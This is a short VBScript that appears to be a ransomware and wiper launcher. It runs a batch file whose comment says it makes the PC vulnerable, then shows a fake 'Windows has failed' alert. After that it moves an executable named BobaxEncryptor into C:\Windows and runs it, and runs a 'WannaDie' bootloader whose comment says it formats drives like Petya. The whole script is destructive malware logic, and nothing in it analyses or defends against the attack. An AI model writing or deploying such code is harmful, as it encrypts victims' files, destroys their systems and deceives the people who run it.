DIM FSO, MyFile
Set oShell = CreateObject( "WScript.Shell" )


''' Make the PC vunerable
CreateObject("Wscript.Shell").Run """Disable.bat""", 1, True

''' Alert Box
z=MsgBox("Windows has failed.", 0+64, "Windows Alert!!!")
WScript.Sleep(1)
CreateObject("Wscript.Shell").Run """111.bat""", 1, True
CreateObject("Wscript.Shell").Run """file.bat""", 1, True


FSO.Movefile "BobaxEncryptor.exe","C:\Windows\"
CreateObject("Wscript.Shell").Run """BobaxEncryptor.exe""", 1, True

'''FORMATS DRIVES... LIKE PETYA
CreateObject("Wscript.Shell").Run """\WannaDie\bootloader\""", 1, True
